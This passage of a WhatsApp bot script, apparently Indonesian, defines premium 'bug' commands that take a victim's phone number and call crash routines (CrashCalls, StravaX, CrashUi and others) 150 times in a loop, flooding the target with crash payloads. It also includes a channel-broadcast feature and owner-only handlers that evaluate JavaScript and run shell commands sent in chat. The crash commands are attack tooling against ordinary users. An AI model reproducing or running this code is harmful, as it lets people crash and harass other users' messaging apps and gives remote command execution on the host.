                    },
                    {
                    header": "For Android",
                        "title": "𝐂𝐫𝐚𝐬𝐡𝐎𝐮𝐭",
                        "description": "⩟",
                        "id": ".bugios4 "
                    },
                    {
                        "header": "For Ios",
                        "title": "Crash Ios",
                        "description": "⩟",
                        "id": ".crashIos"
                    }
                ]
            }
        ]
    }`
},
      viewOnce: true
    }
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: lol2 });
}
break

case 'amaterasu':
case 'bugios1':
case 'bugios2':
case 'bugios3':
case 'bugios4':
case 'bugios5':
case 'bugios6':
{
if (!PremOnly) return ReplyRap(`premium only`)
if (!q) return ReplyRap(`Example: ${prefix + command} 62×××`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return ReplyRap(`*Error!*\n\n_Use : ${command} Number_\n_Example : x-zax 62xx_\n\𝐑zaxyz🐉✰`)
let target = bijipler + '@s.whatsapp.net'
ReplyRap(`[ 𝗣𝗥𝗢𝗦𝗘𝗦 𝗦𝗘𝗡𝗗𝗜𝗡𝗚 𝗕𝗨𝗚 ]
✾ TO :${target}
✾ CMD : *${command}*
✾ TYPE : BUG BUTTON NEW

 \`🍷zaxyz 𝗩1 𝗚𝗘𝗡 1👻\`
\`AllOwnerAustin🐉\`  `)
for (let i = 0; i < 150; i++) {
await CrashCalls(target, ptcp = true)
await StravaX(target, ptcp = true)
await ImproveCrash(target, ptcp = true)
await CrashUi(target, ptcp = true)
await AntiSpiral(target, ptcp = true)
await StravaX(target, ptcp = true)
}
let After = `[ ؆ ] _ResultsCrashed_
 _*\`Status\`*_ : ✅
 _*\`Type\`*_ : _${command}_`
sock.sendMessage(m.chat, {
  caption: After, 
  image: { url: "https://files.catbox.moe/kltqkj.jpg" },
  footer: "zaxyz🌹",
  buttons: [
    { 
      buttonId: `.menu`, 
      buttonText: {
      displayText: '鬒'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.ownerdev', 
      buttonText: {
      displayText: '盛'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.hidetag kamu mana punya😂', 
      buttonText: {
      displayText: 'Weladalah' 
      }, 
      type: 4, 
      nativeFlowInfo: {
    name: 'single_select', 
    paramsJson: `{
        "title": "zaxyz",
        "sections": [
            {
                "title": "zaxyz🌹",
                "highlight_label": "",
                "rows": [
                    {

                        "header": "manipulation bug ( click/relog )",
                        "title": "𝐂𝐫𝐚𝐬𝐡𝐞𝐝𝐅𝐨𝐥𝐝",
                        "description": "Beta Force",
                        "id": ".killed-ui"
                    },
                    {
                    header": "payload ( no click )",
                        "title": "𝐅𝐨𝐥𝐝𝐢𝐧𝐠𝐗𝐦𝐞𝐭𝐚",
                        "description": "⩟",
                        "id": ".zaxyz-elite"
                    },
                    {
                    header": "For Android",
                        "title": "𝐂𝐫𝐚𝐬𝐡𝐎𝐮𝐭",
                        "description": "⩟",
                        "id": ".bugios4 "
                    },
                    {
                        "header": "For Ios",
                        "title": "Crash Ios",
                        "description": "⩟",
                        "id": ".crashIos"
                    }
                ]
            }
        ]
    }`
},
      viewOnce: true
    }
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: lol2 });
}
break
//case gabut/new fitur yeew
case 'jpmch': {
  if (!isCreator) return ReplyRap(mess.owner);
  if (!text) return ReplyRap("Teksnya?"); // Periksa apakah teks tersedia

  // Memuat daftar saluran dari file JSON
  const fs = require('fs');
  let daftarSaluran;
  try {
    daftarSaluran = JSON.parse(fs.readFileSync('./account/idsaluran.json', 'utf8')); // Baca file JSON
  } catch (error) {
    console.error("Gagal membaca file idsaluran.json:", error);
    return ReplyRap("❌ Gagal membaca daftar saluran.");
  }

  // Beri tahu pengguna bahwa proses sedang berlangsung
  ReplyRap("⏳ Harap sabar, proses sedang berlangsung, jeda 5 menit mrnghindari kenon nomor anda...");

  // Kirim pesan ke semua saluran dalam daftar
  for (const idSaluran of daftarSaluran) {
    try {
      await sock.sendMessage(idSaluran, { text: text }); // Mengirim pesan ke saluran
    } catch (error) {
      console.error(`Gagal mengirim ke saluran ${idSaluran}:`, error); // Log jika gagal
    }
  }
  
  ReplyRap("✅ Berhasil mengirim pesan ke semua channel WhatsApp.");
}
break;

case 'addid': {
  if (!isCreator) return m.reply(mess.owner);
  if (!text) return m.reply('❌ Masukkan ID saluran yang ingin ditambahkan.');

  try {
    // Baca file JSON
    let daftarSaluran = JSON.parse(fs.readFileSync('./account/idsaluran.json', 'utf8'));

    // Cek apakah ID sudah ada
    if (daftarSaluran.includes(text)) {
      return m.reply('❌ ID saluran sudah ada dalam daftar.');
    }

    // Tambahkan ID baru
    daftarSaluran.push(text);

    // Simpan kembali ke file JSON
    fs.writeFileSync('./account/idsaluran.json', JSON.stringify(daftarSaluran, null, 2));
    m.reply(`✅ ID saluran berhasil ditambahkan: ${text}`);
  } catch (error) {
    console.error("Error saat menambahkan ID:", error);
    m.reply('❌ Terjadi kesalahan saat menambahkan ID.');
  }
  }
  break;
  
case 'delid': {
  if (!isCreator) return m.reply(mess.owner);
  if (!text) return m.reply('❌ Masukkan ID saluran yang ingin dihapus.');

  try {
    // Baca file JSON
    let daftarSaluran = JSON.parse(fs.readFileSync('./database/idsaluran.json', 'utf8'));

    // Cek apakah ID ada dalam daftar
    if (!daftarSaluran.includes(text)) {
      return m.reply('❌ ID saluran tidak ditemukan dalam daftar.');
    }

    // Hapus ID
    daftarSaluran = daftarSaluran.filter(id => id !== text);

    // Simpan kembali ke file JSON
    fs.writeFileSync('./account/idsaluran.json', JSON.stringify(daftarSaluran, null, 2));
    m.reply(`✅ ID saluran berhasil dihapus: ${text}`);
  } catch (error) {
    console.error("Error saat menghapus ID:", error);
    m.reply('❌ Terjadi kesalahan saat menghapus ID.');
  }
  }
  break;
 
case 'listid': {
  if (!isCreator) return m.reply(mess.owner);

  try {
    // Baca file JSON
    let daftarSaluran = JSON.parse(fs.readFileSync('./account/idsaluran.json', 'utf8'));

    if (daftarSaluran.length === 0) {
      return m.reply('❌ Tidak ada ID saluran yang terdaftar.');
    }

    // Kirim daftar ID
    let teks = '📋 *Daftar ID Saluran:*\n\n';
    daftarSaluran.forEach((id, i) => {
      teks += `${i + 1}. ${id}\n`;
    });
    m.reply(teks);
  } catch (error) {
    console.error("Error saat membaca daftar ID:", error);
    m.reply('❌ Terjadi kesalahan saat membaca daftar ID.');
  }
  }
  break;
  
case 'resetid': {
  if (!isCreator) return m.reply(mess.owner);

  try {
    // Reset file JSON dengan array kosong
    fs.writeFileSync('./account/idsaluran.json', JSON.stringify([], null, 2));
    
    m.reply('✅ Semua ID saluran telah dihapus.');
  } catch (error) {
    console.error("Error saat mereset ID:", error);
    m.reply('❌ Terjadi kesalahan saat menghapus semua ID.');
  }
  break;
}




//END
//END
//======================================================\\
default:
if (budy.startsWith('=>')) {
if (!DevOnly) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!DevOnly) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}
}
//=========================================================\\
if (budy.startsWith('$')) {
if (!DevOnly) return
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
//========================================================\\
}
} catch (err) {
// sock.sendMessage(m.chat, {text: require('util').format(err)}, { quoted: m })
console.log('\x1b[1;31m'+err+'\x1b[0m')
}
}
//========================================================\\
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})
//==========================================================\\